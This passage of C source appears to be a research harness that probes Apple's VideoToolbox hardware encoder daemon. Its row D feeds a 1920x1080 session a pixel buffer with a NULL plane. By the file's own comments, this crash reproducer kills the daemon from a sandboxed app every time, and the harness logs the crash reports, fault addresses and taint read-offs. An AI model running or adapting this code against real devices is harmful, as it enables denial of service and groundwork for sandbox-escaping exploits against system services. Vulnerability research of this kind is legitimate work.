    ds_mp_cell(pfx, "FN3", "FANOUT FLANE-NaN @0x5b4 (NaN 4/4)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7FC00000u, 0, -1, 6);
    for (int bh = 1; bh <= 2; bh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "BH%02d beat", bh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }
    dprintf(STDOUT_FILENO, "%s  B read-offs: compare the H of same-class hits - FI-vs-FI equal H =\n", pfx);
    dprintf(STDOUT_FILENO, "%s  content-only encoding (then FN != FI at equal B = TAINT-DIVERGENT at\n", pfx);
    dprintf(STDOUT_FILENO, "%s  BYTE level = THE semantic-crossing result); unequal same-class H =\n", pfx);
    dprintf(STDOUT_FILENO, "%s  encoder-state ordinality rules (pivot: measure QP deltas not bytes).\n", pfx);
    dprintf(STDOUT_FILENO, "%s  Console oracle: 'data == NULL' = miss; absent + Proc: 2 = consumed.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  A KILLED/.ips = the write-path bug. .ips <-> [stamp].\n", pfx);
}

/* ---- ROW D ------------------------------------------------------------ */

/* one new-surface cell: 1920x1080 session (codec switchable) + ONE probe key */
static void ds_ns_cell(const char *pfx, const char *jid, const char *t, FourCharCode codec,
                       const char *key1, CFTypeRef v1, const char *key2, CFTypeRef v2,
                       int nullPlane)
{
    if (g_opt_conn_poisoned) return;
    if (ds_epoch_exhausted(pfx)) return;
    char stag[40];
    snprintf(stag, sizeof(stag), "NS %s", jid);
    ds_journal_write("START", stag);
    ds_epoch_bump(pfx, jid);
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] %s key1=%s key2=%s nullPlane=%d\n",
            pfx, st0, jid, t, key1 ? key1 : "-", key2 ? key2 : "-", nullPlane);
    int sig = 0, es = -999;
    __block VTCompressionSessionRef csOut = NULL;
    unsigned long f0 = (unsigned long)g_ave_cb_fires, o0 = (unsigned long)g_ave_cb_ok;
    unsigned long b0 = (unsigned long)g_ave_cb_bytes;
    g_ave_cb_err = 0; g_ave_cb_hash = 0;
    uint64_t t0 = mach_absolute_time();
    sig = ds_ave_guard_run_tmo(^int {
        VTCompressionSessionRef cs = NULL;
        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (sp) CFDictionarySetValue(sp, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder, kCFBooleanTrue);
        OSStatus csSt = VTCompressionSessionCreate(NULL, 1920, 1080, codec,
                                                   sp, NULL, NULL, ave_out_cb, NULL, &cs);
        if (sp) CFRelease(sp);
        if (csSt != 0 || !cs) return (int)csSt;
        CFMutableDictionaryRef fp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (!fp) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
        if (key1) { CFStringRef k = CFStringCreateWithCString(NULL, key1, kCFStringEncodingUTF8); if (k) { CFDictionarySetValue(fp, k, v1); CFRelease(k); } }
        if (key2) { CFStringRef k = CFStringCreateWithCString(NULL, key2, kCFStringEncodingUTF8); if (k) { CFDictionarySetValue(fp, k, v2); CFRelease(k); } }
        CVPixelBufferRef pb = NULL;
        CVReturn cr = -1;
        if (nullPlane) {
            /* the vt_Copy NULL-plane repro (v142: STILL guard-free on 23G71):
             * mode-0 CreateWithBytes BIPLANAR 420v - planes=0, plane-1 base NULL.
             * 256x256 input into the 1920x1080 session = the scale-transfer chain
             * (the B2 recipe; the blitter loads ldrb [x14+row] from the NULL array). */
            size_t bpr = 256 * 2, len = bpr * 256 * 3 / 2;
            uint8_t *backing = (uint8_t *)malloc(len);
            if (!backing) { CFRelease(fp); VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
            memset(backing, 0x41, len);
            cr = CVPixelBufferCreateWithBytes(NULL, 256, 256,
                                              kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                              backing, bpr, NULL, NULL, NULL, &pb);
            if (cr != 0) free(backing);   /* CreateWithBytes copies for mode-0 */
        } else {
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (attrs && iosProps) {
                CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
                cr = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_422YpCbCr8, attrs, &pb);
            }
            if (attrs) CFRelease(attrs);
            if (iosProps) CFRelease(iosProps);
        }
        if (cr != 0 || !pb) { CFRelease(fp); VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)cr; }
        if (CVPixelBufferLockBaseAddress(pb, 0) == 0) {
            memset(CVPixelBufferGetBaseAddress(pb), 0x41,
                   (size_t)CVPixelBufferGetBytesPerRow(pb) * (size_t)CVPixelBufferGetHeight(pb));
            CVPixelBufferUnlockBaseAddress(pb, 0);
        }
        OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
        if (b == 0) b = VTCompressionSessionEncodeFrame(cs, pb, CMTimeMake(0, 600), CMTimeMake(1, 600), fp, NULL, NULL);
        if (b == 0) b = VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid);
        CFRelease(fp);
        CVBufferRelease(pb);
        csOut = cs;
        return (int)b;
    }, &es, 10000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (csOut) ds_opt_teardown(pfx, jid, csOut);
    if (sig == SIGALRM) {
        g_opt_conn_poisoned = 1;
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (10s) = CONN DEAD\n", pfx, jid);
    } else if (sig > 0) {
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] sig=%d CLIENT-FAULT @0x%lx\n", pfx, jid, sig, (unsigned long)g_ave_fault_addr);
    }
    if (sig == 0) {
        unsigned long df = (unsigned long)g_ave_cb_fires - f0;
        unsigned long dO = (unsigned long)g_ave_cb_ok - o0;
        unsigned long dB = (unsigned long)g_ave_cb_bytes - b0;
        const char *vd = (dO > 0) ? "ACCEPT" : (df > 0) ? "DROP" : (es != 0) ? "REJECT" : "NO-CB";
        if (strcmp(vd, "ACCEPT") != 0 && (es == -12912 || es == -12914)) vd = "KILLED";
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] es=%d cb+%lu ok+%lu B+%lu err=%d wrSt=%d mkHits=%d t=%.0fms VERDICT=%s\n",
                pfx, jid, es, df, dO, dB, (int)g_ave_cb_err, ds_mp_write_stat, g_ave_mk_hits, tMs, vd);
        if (strcmp(vd, "KILLED") == 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] DAEMON DIED - .ips is the receipt; 12s respawn wait\n", pfx, jid);
            usleep(12000000);
        }
        if (strcmp(vd, "NO-CB") == 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] NO-CB = conn suspect - row stops\n", pfx, jid);
            g_opt_conn_poisoned = 1;
        }
    }
    usleep(80000);
}

void  probe_ave_newsurf(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== D. AVE NEW-SURFACES (v142 - the never-fired 26.6 keys) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s== D. AVE BLITTER-KILL (v143 - the vt_Copy repro) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  mode-0 biplanar NULL-plane -> the guard-free blitter. MAY CRASH DAEMON.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  I[NS00 control] plain encode (must ACCEPT)\n", pfx);
    ds_epoch_bump(pfx, "NS00 control");
    ds_ave_replay(pfx, "NS00 control", 1920, 1080, 1920, kCMVideoCodecType_H264, kCVPixelFormatType_422YpCbCr8, 1, 1);

    /* sane-value discovery cells CUT (v142: D01-D04 all ACCEPT with identical
     * B+489 = the DPB family + FirstMb + HEVC scalar keys rode INERT). v143
     * keeps only the NULL-plane repro (the proven second kill class). */

    /* the vt_Copy NULL-plane repro (expect KILLED - guard-free on 26.6) */
    ds_ns_cell(pfx, "D05", "NULL-plane biplanar 420v 256^2 -> 1080p (the vt_Copy repro)",
               kCMVideoCodecType_H264, NULL, NULL, NULL, NULL, 1);

    for (int dh = 1; dh <= 2; dh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "DH%02d beat", dh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }
    dprintf(STDOUT_FILENO, "%s  D read-offs: D05 KILLED = the vt_Copy NULL-plane class re-confirmed (deterministic\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sandbox-app -> daemon kill #2 on 26.6); ACCEPT = the blitter gained a guard\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (demote). NS00 must ACCEPT. .ips captureTime <-> [stamp].\n", pfx);
}
